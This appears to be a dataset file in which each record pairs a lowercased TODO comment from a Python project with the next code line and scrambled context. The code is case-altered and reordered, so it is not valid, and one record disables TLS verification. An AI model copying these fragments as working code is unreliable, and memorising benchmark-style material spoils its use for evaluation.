# todo: better naming </s> return [tf.pad(input_dict[node.inputs[0]], padding, mode, none, value)]	handle_pad .astype(np.int32)) # tf requires int32 paddings
# todo(phawkins): remove when minimum jaxlib version is 0.1.48 or newer. </s> if lib.version <= (0, 1, 47) and dtype == onp.float64:	_promote_to_real def _promote_to_real(arg): dtype = dtypes.result_type(arg, onp.float64) dtype = onp.float32 return lax.convert_element_type(arg, dtype)
# todo  batch size is changed </s> label_field = self.config['label_field']	_neg_sampling_to user_num_in_one_batch = self.batch_size // self.neg_sample_to self.batch_size = (user_num_in_one_batch + 1) * self.neg_sample_to self.dataset.field2type[label_field] = 'float' self.dataset.field2source[label_field] = 'inter'
# todo: port status changes should cause us to withdraw a route. </s> for bgp_speaker in self.bgp_speakers.itervalues():	reset_bgp def reset_bgp(self): bgp_speaker.shutdown() for vlan in self.valve.dp.vlans.itervalues():
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo: this regex could change based on project req format </s> prefix = re.search("[a-za-z]+", str(row[id_col].value)).group(0)	import_xlsx attributes[col_headers[j]] = cell.value if i: req = row[id_col].value try:
# todo(lipu): fix this to show front page pictures </s> return []	getNotCollectedThumbnailTorrents def getNotCollectedThumbnailTorrents(self, limit=20): result = [] for t in self.metadata_db.getNotCollectedThumbnailTorrents(TUMBNAILTORRENT_REQ_COLUMNS, limit=limit):
# todo(parallel): to support nn.dataparallel, this must be changed, as it not a tensor </s> return decout(x)	forward x = self.body(x) + x x = self.tail(x)
# todo: add this test </s> self.asserttrue( true )	test_no_code_disclosure def test_no_code_disclosure(self):
# todo: remove this log once we find out what's causing oom </s> log.info('running readthedocs.oauth.tasks.sync_remote_repositories. locals=%s', locals())	sync_remote_repositories if not user: return failed_services = set() for service_cls in registry:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_non_tail_transaction Trying to get a bundle for a non-tail transaction. This is not valid; you have to start with a tail transaction.
# todo: parse the field contents </s> self.xe_fields.append(xe)	__call__ xe = parse_xe(field.instructions[0][1], log)  # TODO: Handle field with multiple instructions if xe:
# todo: write tests </s> from any tag with @meter.count and @meter.unit attributes, make a :class:`timesignature`.	_timeSigFromAttrs def _timeSigFromAttrs(elem): :param :class:`~xml.etree.ElementTree.Element` elem: An :class:`Element` with @meter.count and @meter.unit attributes.
# todo: rename this to event_data.parser_chain or equivalent. </s> if not getattr(event_data, 'parser', none) and parser_chain:	ProcessEventData KeyError: if there's an attempt to add a duplicate attribute value to the event data. event_data.parser = parser_chain if not getattr(event_data, 'text_prepend', None) and self._text_prepend:
# todo: don't create dsdp directory. add these files </s> shutil.move("col_row.nl","./dsdp/")	sensitivity_calculation fp.write(contents) try: shutil.move("col_row.col","./dsdp/") shutil.move("col_row.row","./dsdp/")
# todo have no idea if is cdecl or stdcall </s> flag = params["processinformationclass"]	hook_ZwQueryInformationProcess }) def hook_ZwQueryInformationProcess(self, address, params): dst = params["ProcessInformation"] pt_res = params["ReturnLength"]
# todo also handle method and request </s> return proxy.reverseproxyresource.render(self, request)	doneAllPrehooks def doneAllPrehooks(result): request.content = StringIO.StringIO(json.dumps(result["Body"]))
raise notimplementederror  # todo(mattjj) </s> def full_lower(self):	SplitTracer return core.get_aval(self.val) def unpack(self): if self.name is None: return core.full_lower(self.val)
# todo: actually parse this </s> self.data = data	_DynamicPool def __init__(self, _id, data): self._id = _id def _data(self): return self.data
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_simple batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) scores = model.forward_cwa(triples[:, :2])
# todo: write </s> return dict.fromkeys(key_strings, callback)	string_keys_to_dict def string_keys_to_dict(key_strings, callback):
# todo confirm we want floor division here </s> utilities.reshape(numalts, utilities.size() // numalts)	mnl_probs if numalts == 0: raise Exception("Number of alternatives is zero") exponentiated_utility = utilities.exp(inplace=True) if clamp:
# todo(john-wood-w) allow until plugin validation is added. </s> self.secret_req['mode'] = 'badmode'	test_should_allow_bad_mode def test_should_allow_bad_mode(self): result = self.validator.validate(self.order_req) self.assertTrue('secret' in result)
# todo: avoid dummy and generate func here when inlining is possible </s> def _impl(df, n=5):	_impl return hpat.hiframes.pd_dataframe_ext.head_dummy(df, n)
# todo: arrange </s> result = self.remote.find_repo({"name": "testrepo0"}, self.token)	test_find_repo def test_find_repo(self, createRepo): Test: find a repo object self.assertTrue(result)
# todo: plumb gravitylayout.__init__'s arguments into the config file </s> h - (self.margin_y * 2))	__call__ w - (self.margin_x * 2),
#     todo </s> return os.close(fh)	Filesystem def release(self, path, fh):
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_read_raw = p_operation.add_parser( "read-raw", help="read raw track data")
# todo(brett.cannon) implement </s> pass	test_path_importer_cache_has_None def test_path_importer_cache_has_None(self):
pass # todo </s> def try_undo(self, *args):	try_undo
# todo(buggay): implement num_vms_per_host functionality </s> self.num_vms_per_host = vm_spec.num_vms_per_host	AzureVirtualMachine self.availability_zone = util.GetAvailabilityZoneFromZone(self.zone) self.use_dedicated_host = vm_spec.use_dedicated_host if self.num_vms_per_host: raise NotImplementedError('Num vms per host for Azure is not supported.')
# todo: why so inaccurate? </s> np.testing.assert_allclose(ret.data, out.detach().numpy(), atol=atol)	test_op out = f1(*ts) ret = f2(*tst) out.mean().backward() ret.mean().backward()
return none # todo </s> def _listplaylists(self):	_listplaylists
# todo: currently the output code directly accesses the format string </s> self.format_string = none	EventFormatter def __init__(self): super(EventFormatter, self).__init__() self.source_string = unicode(self.SOURCE_LONG) self.source_string_short = unicode(self.SOURCE_SHORT)
# todo: remove when fixed in upstream gtk+ </s> stylecontext = self.props.view.get_style_context()	GutterRendererChunkAction self.set_background(None) else: background_set, background_rgba = ( stylecontext.lookup_color('theme_bg_color'))
g.configure_new(config) # todo: test for emitted warning </s> print(g)	test_fully_connected_hidden_nodirect_old self.assertEqual(gid, g.key) print("\nThis should output a warning:", file=sys.stderr) self.assertEqual(set(iterkeys(g.nodes)), {0, 1, 2}) self.assertEqual(len(g.connections), 6)
# todo support multiple backends </s> self.backends[0].stored_playlists.playlists = playlists	playlists @playlists.setter  # noqa def playlists(self, playlists):
# todo: revert this. </s> from astropy.tests.helper import quantity_allclose	HeliographicStonyhurst _default_wrap_angle = 180*u.deg def __init__(self, *args, **kwargs): _rep_kwarg = kwargs.get('representation', None) wrap = kwargs.pop('wrap_longitude', True)
#@todo: integrate this function with the one below - the pipeline() method only works with this function </s> xs["targets"] = [1.0 if xs[ans_name][i] == cand else 0.0	jtr_map_to_targets def jtr_map_to_targets(xs, cands_name, ans_name): Create cand-length vector for each training instance with 1.0s for cands which are the correct answ and 0.0s for cands which are the wrong answ for i in range(len(xs[ans_name])) for cand in xs[cands_name][i]]
# todo refactor this function </s> project = version.project	index_search_request In order to keep sub-projects all indexed on the same shard, indexes will be updated using the parent project's slug as the routing value. log_msg = ' '.join([page['path'] for page in page_list]) log.info("Updating search index: project=%s pages=[%s]",
# todo: find a better image here </s> res_icon_height = (imagefillstatusbutton.cell_size[1] + imagefillstatusbutton.padding)	_connect_multiple_input_res_for_production y = (27 * consumed_resources_count) centered_container.position = (0, y) size = (14, (res_icon_height * consumed_resources_count) + 17) image = Icon(image=self.PRODUCTION_LINE_IMAGE)
''' todo: change conditional to return on non-http responses </s> to reduce branch depth'''	getCDXJLinesFromFile cdxjLines = [] for entry in iter(fh): if entry.record.rec_type != 'response' or \ entry.get('mime') in ('text/dns', 'text/whois'):
# todo: should this raise ioerror? </s> with raises(ioerror):	test_invalid_data_byte def test_invalid_data_byte(): read_file(HEADER_ONE_TRACK + """ 4d 54 72 6b  # MTrk
# todo: checking that hour/minute/second are not </s> _assign_hms(res, value_repr, hms)	_parse (i, hms) = _parse_hms(i, l, info, hms_idx) if hms is not None: elif (len(ymd) == 3 and len_li in (2, 4) and res.hour is None and
# todo: give a vanilla example </s> .. math::	re def re(predicted_power, df_appliances_ground_truth): error^{(n)} = \\sqrt{ \\frac{1}{T} \\sum_t{ \\left ( y_t - \\hat{y}_t \\right )^2 } } Attributes
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_transfers_empty def test_fail_transfers_empty(self): ``transfers`` is an array, but it is empty.
# env.reset()  # todo: remove once traffic bug is fixed </s> try:	run session_done = False episode = 0 while not session_done: if episode_done:
#            print "monitor[0] in if self.todo.isddc is",  monitor[0] </s> self.ctree.node_set_row_data (node, (parent, monitor))	MonitorWindow monitor = (self.todo.x.state, self.todo.x.state, self.todo.x.monVert, self.todo.x.monHoriz) select = node selParent = parent
# todo: require rewrite </s> if not start_time:	regularize Output: Dict that can be converted into pandas.Series directly by calling pandas.Series(Dict) start_time = self.domain.start() if start_time == -inf:
# todo: unfortunately, this feature is not yet implemented for python </s> pass	test_tls_trust_on_first_use def test_tls_trust_on_first_use(self):
# todo: provide more informative errors </s> try:	grant def grant(): Character control endpoint for policy granting. request_data = json.loads(request.data) bob_pubkey = bytes.fromhex(request_data['bob_encrypting_key'])
# todo: this is lazy, we should only reconfigure the drone(s) who are actually </s> if drone_edge:	_handle_command_bait_user_changed drone_edge = db_session.query(DroneEdge).filter(DroneEdge.username == username, DroneEdge.password == password).first() self._reconfigure_all_clients()
# todo(harlowja): move this code into </s> tz_file = os.path.join(self.tz_zone_dir, str(tz))	set_timezone def set_timezone(self, tz): if not os.path.isfile(tz_file): raise RuntimeError(("Invalid timezone %s,"
rec_dict._proxy._handle.close() #todo - better solution </s> del rec_dict	key_check rec_dict = SeqIO.index(filename, format, alphabet, add_prefix) self.check_dict_methods(rec_dict, key_list, id_list) if not sqlite3: return
# todo(cutwater): replace `.decode('utf-8')` call with subprocess </s> tag_info = subprocess.check_output([	get_git_version :raises RuntimeError: If cannot determine git version string. try: 'git', 'describe', '--always', '--match', TAG_PREFIX + '*'] ).decode('utf-8').strip()
# todo: logger always requires extras['cls'] : can we fix this? </s> logger.warning(msg=msg, extra=dict(cls=none))	_build_mesh " -- ignoring this as it is inconsistent." ) node_dimension = None edge_dimension = getattr(mesh_var, "edge_dimension", None)
# todo(jeremydw): better headers. </s> headers = {	_write_file bucket_key.key = path.lstrip('/') mimetype = mimetypes.guess_type(path)[0] 'Cache-Control': 'no-cache', 'Content-Type': mimetype,
# todo: send alert </s> blacklist_whitelist_notification.delay(3) # notice_type = 3 blacklist	chk_prefix_in_blacklist break if flag: return False return True
# todo: use validation set if not-none </s> model = self.new_model()	best_model_indexed_vector_classification def best_model_indexed_vector_classification(self, train, valid): X = train.all_vectors[train.idxs] y = train.all_labels[train.idxs]
end_date=none,  # todo: expire me? </s> )	submit_draft_for_review draft.approval = DraftRegistrationApproval( initiated_by=auth.user, draft.save() REVIEW_EMAIL = Mail(tpl_prefix='prereg_review', subject='New Prereg Prize registration ready for review')
# todo: check that the performance measure is within some range </s> bottleneck0_baseline(num_runs=1, sumo_binary="sumo")	test_bottleneck0 Tests flow/benchmark/baselines/bottleneck0.py
loop=asyncio.new_event_loop(),  # todo: this doesn't work without this </s> )	test_issue_631_sharing_event_loop token=self.bot_token, run_async=False, new_message = self.web_client.chat_postMessage(channel=self.channel_id, text=self.text) self.assertFalse("error" in new_message)
# todo: with only non-mandatory model attributes, it is not possible to get an invalid form </s> else:   # coverage: ignore branch	system_exporter_spreadsheet_csv_config_view info_logger(str(request.user), " SYSTEM_EXPORTER_SPREADSHEET_CSV_CONFIG_CHANGED") return HttpResponse('<script type="text/javascript">window.close();</script>') return render( request,
# todo should this reset the pts and such? </s> self._updates.appendleft(stopiteration())	_stop_workers and also clears all of them off the list with self._updates_lock: self._updates_available.set() for t in self._worker_threads:
# todo(tdurakov): remove dict to object conversion once rpc api version </s> if isinstance(migrate_data, dict):	_rollback_live_migration instance.progress = 0 instance.save(expected_task_state=[task_states.MIGRATING]) migration = migrate_data.pop('migration', None) migrate_data = \
# todo: maybe_decay_array </s> return runtime.strarray(val.strs)	_EvalIndirectArrayExpansion if val.tag == value_e.StrArray: if index in ('@', '*'): try: index_num = int(index)
# todo - remove by nov 1 2017 if soft assert is never sent </s> _soft_assert_dict(false, "context is type %s" % str(type(context)))	_get_dict_from_context return context.flatten() else: return context
gray_img = color.rgb2gray(state)  # todo: check image conversion doesn't cause problems </s> downsized_img = transform.resize(gray_img, (84, 84), mode='constant')  # todo: check resizing doesn't cause problems	state_to_tensor def state_to_tensor(state): return torch.from_numpy(downsized_img).unsqueeze(0)  # Return 3D image tensor
# todo: clean up this event print out. we probably want something </s> if suffix == 'ret':  # for "ret" just print out return	print_async_event def print_async_event(self, suffix, event): Print all of the events with the prefix 'tag' salt.output.display_output(event['return'], '', self.opts) elif isinstance(event, dict) and 'outputter' in event and event['outputter'] is not None:
# todo: support grouping and stacking at the same time </s> if self.attributes['stack'].columns is not none:	_yield_renderers group_label=self._get_label(group['group'])) renderers.append(bg) label = str(self._get_label(group['stack'])) elif self.attributes['group'].columns is not None:
#todo(qos): support the fields parameter </s> return self._get_policy_obj(context, policy_id).to_dict()	get_policy def get_policy(self, context, policy_id, fields=None):
# todo(b/195364460): work around slow xla/cpu implementation of float16 matmul </s> if c.get_shape(lhs).numpy_dtype() == np.float16:	_dot_general_cpu_translation_rule if preferred_element_type is not None: preferred_element_type = xla_client.dtype_to_etype(preferred_element_type) lhs = xops.ConvertElementType(lhs, xla_client.dtype_to_etype(np.float32)) rhs = xops.ConvertElementType(rhs, xla_client.dtype_to_etype(np.float32))
pass  # todo: implement </s> def predict(self):	predict
# todo: send message with login link. </s> time_left = 60	too_many_requests_status error_data.message is displayed in the flash message error_data.timeout determines how long until flash message disappears resp = jsonify( {'message': (ERROR_DICT[err.code]).format(time_left), 'timeout': 5}
# no todo item selected </s> pass	_pri_selected_item str(self.view.todolist.number(todo)), p_priority)) except AttributeError:
# todo: this should take a vector </s> return self._mfmuii	MfMuiI self._MfMuiI = self.mesh.getFaceInnerProduct(self.mui, invMat=True)
# todo: check rackspace file existence </s> return os.path.isfile(safe_join(filepath, filename))	zip_existing filename=self.download_name(app, ty)
# todo: make sure we have a test case for the above point. </s> result = _get_value(result, part)	get break if result is _NOT_FOUND: return default
# todo: add multiple $root support </s> if pkg.root != self.target_root:	_iter_args_for_pkg def _iter_args_for_pkg(self, pkg): return atom_arg_map = self._atom_arg_map
# todo(b/138845899): consider use span instead of id. </s> latest_artifact = max(	_prepare_input_for_processing matched_artifacts.append(artifact) if matched_artifacts: matched_artifacts, key=lambda artifact: artifact.id) tf.logging.info('latest_artifact {}.'.format(latest_artifact))
# todo: make sure package names can't be changed to look like package ids? </s> return pkg	_get_pkg if pkg == None: pkg = model.Package.by_name(id)
# todo - needs tests </s> customer, created = customer.get_or_create(user)	sync_customer def sync_customer(user): cu = customer.stripe_customer customer.sync(cu=cu)
# todo: log non-bool return values? </s> return bool(self._mixer.set_volume(volume).get())	set_volume return False with _mixer_error_handling(self._mixer): return False
# todo(stevemar): assert returned fields </s> + ' ' + self.object_name)	test_object_show self.openstack('object show ' + self.CONTAINER_NAME
#todo: actually check for change </s> self._smudge('__delitem__slice',k,v)	DirtyList list.__delitem__(self, k) if isinstance(k, slice): else: self._smudge('__delitem__', k, None)
# todo (cyyber): move to state cache, instead of writing directly </s> for protobuf_txn in block.transactions:	update_tx_metadata if len(block.transactions) == 0: return txn = Transaction.from_pbdata(protobuf_txn) if txn.subtype in (qrl_pb2.Transaction.TRANSFER,
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo check the trigger_id content </s> template_name = 'add_service.html'	edit_service def edit_service(request, trigger_id): edit a service service = get_object_or_404(TriggerService, pk=trigger_id) form = TriggerServiceForm(instance=service)
raise exception #todo </s> self.key = key	__init__ if isinstance(key, basestring): if key not in columns: else: for k in key:
# todo: catch unquoting errors, range of chars, charset </s> decoded_v = urllib.unquote(esc_v)	_parse_params if lang != '': self.setMessage(name, rs.PARAM_LANG, param=k, lang=lang) param_dict[k.lower()] = decoded_v else:
# todo add tests </s> def copy_augmentables(augmentables):	copy_augmentables if ia.is_np_array(augmentables): return np.copy(augmentables)
#  todo: test </s> skill="industrial command ships",	handler src.getModifiedItemAttr("shipBonusICS3"),
# todo: return errors in a universal way </s> print("shivyc: error: no such file or directory: '{}'"	main c_file = open(arguments.file_name) except IOError: .format(arguments.file_name)) return
# todo: then we can pull the descriptor out of the tile_spec </s> pass	create_storage_unit_from_datasets except OSError:
"""todo: doesn't remove unused nodes/renumber elements""" </s> x = self.xyz[:, 0]	slice_x def slice_x(self, xslice): self._slice_plane(x, xslice)
# todo (#567): bucket the node as suspicious </s> return	learn_from_teacher_node self.known_nodes.mark_as(current_teacher.InvalidNode, current_teacher) self.log.warn(f"Teacher {str(current_teacher)} is invalid (hex={bytes(current_teacher.metadata()).hex()}):{e}.") except RuntimeError as e: if canceller and canceller.stop_now:
# todo: find a value for % width </s> raise typeerror('width %s is unknown' % box.style['width'])	block_preferred_width return box.margin_width() else:
# todo: implement this </s> pass	_chmod_u_rx def _chmod_u_rx(path, recursive=False):
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo: delete _check_on_hpc_hooks in v1.8 </s> def _check_on_hpc_hooks(model: "pl.lightningmodule") -> none:	_check_on_hpc_hooks if is_overridden("on_hpc_save", model): rank_zero_deprecation(
# todo: support dynamic conversion </s> if on is not none:	_run_call_rolling on = self.typemap[on.name].literal_value nodes = [] window = guard(find_const, self.func_ir, window) if not isinstance(window, str):
# todo(b/172668718) enable tests after b/172668718 is resolved. </s> "auto_tpu_strategy": self.auto_tpu_strategy(),	test_run_on_notebook def test_run_on_notebook(self): track_status = { "auto_multi_worker_strategy": self.auto_multi_worker_strategy(), "docker_config_parent_img": self.docker_config_parent_img(),
# todo: consider passing search_dirs in the constructor. </s> return self.unicode(text, encoding)	read encoding = self.file_encoding
#todo: maybe i should still update specials? </s> logger.log("not updating episodes for show "+self.show.name+" because it's marked as ended.", logger.debug)	execute self.show.loadFromTVDB(cache=not self.force) if self.show.status == "Ended": sickbeard.showQueueScheduler.action.refreshShow(self.show, True) return
# todo: translate </s> context["title"] = "posts about %s:" % tag	task_render_tags context = {} context["lang"] = lang context["items"] = [("[%s] %s" % (post.date, post.title(lang)), post.permalink(lang)) for post in post_list] yield generic_post_list_renderer(
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: handle escape (0x1b) </s> for d in data:	decode_in def decode_in(self, data): d = ord(d) if not self.in_parsing and d != kamstrup_constants.REQUEST_MAGIC:
).consume()  # todo see issue 170 </s> for instance in reservation["instances"]:	load_ec2_instances Region=region, aws_update_tag=aws_update_tag, instanceid = instance["InstanceId"] monitoring_state = instance.get("Monitoring", {}).get("State", "")
exported.js_support = current.js_support  # todo: check articles have js_support </s> exported.save()	migrate_mini_tuto exported.image = current.image exported.description = current.description [exported.subcategory.add(category) for category in current.subcategory.all()] [exported.helps.add(help) for help in current.helps.all()]
# @todo: is this always true? </s> sg.attrs["staggering"] = 0	_write_fields_to_gdf else: sg.attrs["field_units"] = "None" g = fhandle["data"] for grid in ds.index.grids:
# todo this is also doing a mongo query for each owner </s> django_obj.user_id = none	save_page_of_fk_relationships django_obj.node_id = None elif isinstance(modm_obj.owner, MODMNode): django_obj.node_id = modm_to_django[format_lookup_key(modm_obj.owner._id, model=AbstractNode)] elif modm_obj.owner is None:
# todo: when timers are introduced, just make this wait </s> if not self._event.is_set():	warnings (call :meth:`.result()`, or after callback is invoked). Otherwise it may throw if the response has not been received. raise Exception("warnings cannot be retrieved before ResponseFuture is finalized") return self._warnings
# todo it might still leave unused database entries referring to the community id </s> database.execute(u"delete from community where id = ?", (community_database_id,))	join_community community.create_dispersy_identity() except: raise else:
# todo make this configurable </s> if user.name in self.displayed_nicks.values():	join def join(event, date, is_state): user = self.room.users[event.sender] nick = event.sender[1:] else:
# todo: grab values from blender lamps </s> 'constantattenuation': 1,	export_light 'point': { 'color': (light.color * light.energy)[:], 'linearAttenuation': linear_factor, 'quadraticAttenuation': quad_factor,
# todo: why do we have an __init__? we should be able to set up the class inside the </s> self.state = state	__init__ def __init__(self, state=None):
#todo: add support for root position v7 chords with missing fifth </s> raise resolutionexception("pitches do not form a correctly spelled dominant seventh chord.")	dominantSeventhToSubmediant c = chord.Chord(copy.deepcopy(pitches)) if not c.isDominantSeventh(): if not len(pitches) == 4: raise ResolutionException("Not a four part chord. Can't resolve.")
# todo: tighten this filter to match on the string of the error </s> s = customserializable(as_wrapper=false)	test_forgotten_protobuf_type_flag s = CustomSerializable() with pytest.raises(AttributeError) as e:
# todo: should be able to pass in an optional function for </s> node_type = 'cdao:terminalnode' if clade.is_terminal() else 'cdao:ancestralnode'	process_clade (Uri(tu_uri), qUri('rdf:label'), clade.name), ] statements += [ (Uri(clade.uri), qUri('rdf:type'), qUri(node_type)),
# todo iterate with schematizer as to exact interface </s> return schemastoreregisterresponse(	_format_register_response def _format_register_response(self, raw_resp): avro_dict=raw_resp['schema'], table=raw_resp['kafka_topic'].split('.')[-2],
# todo docstring </s> desired_node_applications = []	change_node_configuration def change_node_configuration(self, desired_configuration, hostname): docstring for change_node_configuration for node in desired_configuration.nodes: if node.hostname == hostname:
# todo assert cls.__tablename__ == '' </s> with dbcleanup(session, cls):	test_HistoryDatasetAssociationTagAssociation model, session, history_dataset_association, tag, user): cls = model.HistoryDatasetAssociationTagAssociation user_tname, value, user_value = 'a', 'b', 'c' obj = cls(user=user, tag_id=tag.id, user_tname=user_tname, value=value)
# todo: remove in django 1.10 </s> connections['slave'].cursor().close()	test_db with self.assertNumQueries(1): list(Category.objects.cache()) with self.assertNumQueries(1, using='slave'): list(Category.objects.cache().using('slave'))
# todo: abort cleanly here, as the resolution has been </s> assert (	_prepare self._dist = abstract_dist.get_pkg_resources_distribution() assert self._dist is not None, "Distribution already installed" self._name is None or self._name == canonicalize_name(self._dist.project_name)
# todo: add cn to domains? </s> domains = crypto_util.get_sans_from_csr(csr.data, openssl.crypto.filetype_asn1)	obtain_certificate_from_csr :rtype: tuple csr = le_util.CSR(file=self.config.csr[0], data=self.config.csr[1], form="der") for d in domains: domain_callback(self.config, d)
# todo(john-wood-w) allow until plugin validation is added. </s> del self.secret_req['algorithm']	test_should_allow_empty_algorithm def test_should_allow_empty_algorithm(self): result = self.validator.validate(self.order_req) self.assertTrue('secret' in result)
# todo(bichen): move this color dict to configuration file </s> cls2clr = {	image_demo final_probs = [final_probs[idx] for idx in keep_idx] final_class = [final_class[idx] for idx in keep_idx] 'car': (255, 191, 0), 'cyclist': (0, 191, 255),
# todo: use different flag than .reentrant </s> if colorsorter._relative_transforms():	schedule_wiresphere color, pos, radius, ColorSorter._debug_transforms() ##### if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: ColorSorter._warn_transforms_nim("schedule_wiresphere") if drawing_globals.use_c_renderer and ColorSorter.sorting:
# todo: raise an exception </s> return	disable_extension def disable_extension(self, extension_id): if extension_id not in self._extension_instances: extension = self._extension_instances[extension_id] extension.registration.enabled = False
# todo: this code need to be revised </s> for k, v in tool_panel_dict_for_tool_config.items():	handle_repository_contents tool_config, tool_sections=tool_sections) tool_panel_dict_for_display[k] = v for _tool_panel_dict in v:
# todo: these two probably shouldn't reach back to main.. </s> def on_save(self):	on_save main.exaile().playlists.save_playlist(self.playlist, overwrite=True)
# todo: cmake imported target shouldn't be namespaced (waiting https://github.com/conan-io/conan/issues/7615 to be implemented) </s> self.cpp_info.names["cmake_find_package"] = "cryptopp"	package_info def package_info(self): self.cpp_info.names["cmake_find_package_multi"] = "cryptopp" self.cpp_info.names["pkg_config"] = "libcryptopp"
# todo(dustin): we used to take non when the vcs was unknown. now we'll only </s> ver = none	get_versions ver = versions_from_vcs_f(tag_prefix, root, verbose) except AttributeError: if ver: if verbose: print("got version from VCS %s" % ver)
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.asserttrue(torch.allclose(outputs.logits[:, :4], expected_logits, atol=1e-2))	test_inference_diarization self.assertEqual(labels[0, :, 0].sum(), 270) self.assertEqual(labels[0, :, 1].sum(), 647)
# xxx todo </s> return address, size	input_address_range size    = None
commonname = "goagent xx-net - goagent" #todo: here should be goagent - xx-net </s> cmd = ['certutil', '-l','-d', 'sql:%s' % nss_path, '-n', commonname]	get_debian_ca_sha1 def get_debian_ca_sha1(nss_path): lines = get_cmd_out(cmd) get_sha1_title = False
#todo use backup phone </s> generated_token = totp(token.seed)	verify_computer token = user.token if token.method in ('call', 'sms'): if token.method == 'call': call(to=token.phone,
# todo(yamahata): ephemeraln where n > 0 </s> if num > 0:	_ephemeral_size def _ephemeral_size(instance_type, ephemeral_name): num = block_device.ephemeral_num(ephemeral_name) return 0 return instance_type.get('local_gb')
# todo: make it possible to plot a plated variable using _subplots function. </s> if axes is none and fig is none:	pdf x : array Grid points axes = plt.gca() else:
# todo(emfree): remove after status overhaul. </s> if account.sync_state != 'running':	create_account account.smtp_endpoint = (response['smtp_server_host'], response['smtp_server_port']) account.sync_state = None return account
# todo(ib-steffen): allow custom ca bundles </s> r = requests.post(url, files=files, headers=headers, timeout=120, verify=false)	post headers = {'Authorization': 'bearer ' + token} logger.info('Also uploading to %s', url) if r.status_code != 200: abort(500, "Failed to upload data")
# todo raise exception </s> return {}	journals_display def journals_display(file_name): if not os.path.exists(JOURNALS_PATH): for category in os.listdir(JOURNALS_PATH): for journal in filter(lambda x: x.endswith(".journal"), os.listdir(os.path.join(JOURNALS_PATH, category))):
# todo. create readme file in <output_dir> </s> step = arguments['--step']	main output_dir = Path(arguments['<output_dir>']) output_dir = output_dir.expanduser().resolve(strict=False) if step is not None: step = float(step)
# todo -- make sure more stringent and parse each kext in-memory so we only allow whitelist from .text </s> kmods = [(kmod.address, kmod.address + kmod.m('size'), kmod.name) for kmod in lsmod.mac_lsmod(obj_ref._config).calculate() if str(kmod.name) != "com.apple.kpi.unsupported"]	get_kernel_function_addrs import volatility.plugins.mac.lsmod as lsmod kernel_symbol_addresses = obj_ref.profile.get_all_function_addresses() return (kernel_symbol_addresses, kmods)
# todo: remove this once sphinx is gone. </s> dt = (time.time() - start) * 1000	search results_.set_cookie(settings.LAST_SEARCH_COOKIE, urlquote(cleaned['q']), max_age=3600, secure=False, httponly=False) statsd.timing('search.%s.view' % engine, int(dt)) return results_
# todo: use zfs plugin </s> proc = await popen([	SystemDatasetService createdds = False for dataset in datasets: 'zfs', 'get', '-H', '-o', 'value', 'mountpoint', dataset, ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_hashes_empty def test_fail_hashes_empty(self):
recording_name = none  # todo </s> system_info = none #todo	recording_update_pupil_mobile_to_pprf_2_0 recording_software_name = None  # TODO recording_software_version = None  # TODO new_info_file = RecordingInfoFile.create_empty_file(rec_dir) new_info_file.recording_uuid = recording_uuid
# todo: support default period argument </s> out = ary	resolve_pct_change @bound_function("series.pct_change") def resolve_pct_change(self, ary, args, kws): if isinstance(ary.dtype, types.Integer): out.dtype = types.float64
# todo: wobble </s> return einsum('i...,ij...->j...', vector, rotation)	spin ])
# todo: optimize db call </s> dataset_instance = dataset_collection.collection.dataset_instances[ 0 ]	__summarize else: dataset_collection = content if not self.__check_state( dataset_instance ): continue
# todo test that these are the right attributes </s> if k=='metabolites':	load_json_model for k, v in reaction.iteritems(): if k=='reversibility': continue for met, coeff in v.iteritems(): new_reaction.add_metabolites({model.metabolites.get_by_id(met): coeff})
# todo implement. </s> yaml = self.master_model.to_yaml()	_train def _train(self, rdd, nb_epoch, batch_size, verbose, validation_split):
# todo: this is untested. </s> _raise_current_error()	load_certificate_request raise ValueError("type argument must be FILETYPE_PEM or FILETYPE_ASN1") if req == _ffi.NULL: x509req = X509Req.__new__(X509Req) x509req._req = _ffi.gc(req, _lib.X509_REQ_free)
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	ensure_filtering_rules_for_instance are not completed. :params instance_ref: nova.db.sqlalchemy.models.Instance object
# todo check output </s> tmp_file = 'tmp_obj'	_test_obj ' ' + obj_name) self.addCleanup(os.remove, obj_name) self.addCleanup(os.remove, tmp_file) self.openio('object save ' + self.CONTAINER_NAME +
# test for uwsgi -- todo save this somewhere so we only have to do it once. </s> self.is_uwsgi = false	__init__ self.citation_cache_data_dir = self.resolve_path( kwargs.get( "citation_cache_data_dir", "database/citations/data" ) ) self.citation_cache_lock_dir = self.resolve_path( kwargs.get( "citation_cache_lock_dir", "database/citations/locks" ) ) try: import uwsgi
# todo add read unlock </s> pass	read_current_batch self.storage_reader.read() finally:
# todo fetch a real object </s> return loc_code	location_from_code def location_from_code(self, loc_code):
# todo compare file contents? </s> self.sim.update_timestamp()	test_refresh updater = self._new_updater() updater.refresh() updater = self._new_updater() updater.refresh()
pass # todo </s> def handle_request(self, input):	handle_request
# todo: create a log message this error? </s> result_dict['isopen'] = false	_package_list_with_resources result_dict['isopen'] = isopen except KeyError: else: result_dict['isopen'] = False
